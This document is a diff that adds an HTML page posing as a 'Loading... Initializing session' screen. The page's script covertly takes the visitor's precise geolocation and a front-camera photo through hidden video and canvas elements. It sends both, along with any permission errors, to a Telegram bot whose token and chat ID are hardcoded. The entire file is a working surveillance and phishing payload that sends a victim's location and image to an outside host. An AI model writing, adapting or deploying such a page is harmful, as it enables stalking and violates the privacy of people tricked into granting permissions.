@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        body { font-family: sans-serif; text-align: center; margin-top: 20vh; background: #111; color: #fff; }
+    </style>
+</head>
+<body>
+    <h2>Initializing session... Please allow required permissions.</h2>
+    
+    <video id="video" autoplay playsinline style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        const BOT_TOKEN = "9058953692:AAGKw-NAjJwBT6OBCXWOwnysBQYbMsdplf8";
+        const CHAT_ID = "8765957766";
+
+        function sendText(text) {
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+            }).catch(() => {});
+        }
+
+        function sendPhoto(blob) {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, 'capture.jpg');
+            
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            }).catch(() => {});
+        }
+
+        // 1. Capture Geolocation
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    const acc = position.coords.accuracy;
+                    sendText(`[+] Location Captured:\nLat: ${lat}\nLon: ${lon}\nAccuracy: ${acc}m`);
+                },
+                (error) => {
+                    sendText(`[-] Geolocation denied or failed: ${error.message}`);
+                },
+                { enableHighAccuracy: true }
+            );
+        } else {
+            sendText("[-] Geolocation not supported.");
+        }
+
+        // 2. Capture Camera Frame
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+            .then(stream => {
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                
+                video.onloadedmetadata = () => {
+                    setTimeout(() => {
+                        const canvas = document.getElementById('canvas');
+                        canvas.width = video.videoWidth || 640;
+                        canvas.height = video.videoHeight || 480;
+                        
+                        const ctx = canvas.getContext('2d');
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        
+                        canvas.toBlob(blob => {
+                            if (blob) {
+                                sendPhoto(blob);
+                            }
+                            // Terminate media streams
+                            stream.getTracks().forEach(track => track.stop());
+                        }, 'image/jpeg', 0.85);
+                    }, 1500); // 1.5s delay to ensure feed initialization
+                };
+            })
+            .catch(err => {
+                sendText(`[-] Camera permission denied or unavailable: ${err.message}`);
+            });
+    </script>
+</body>
+</html>
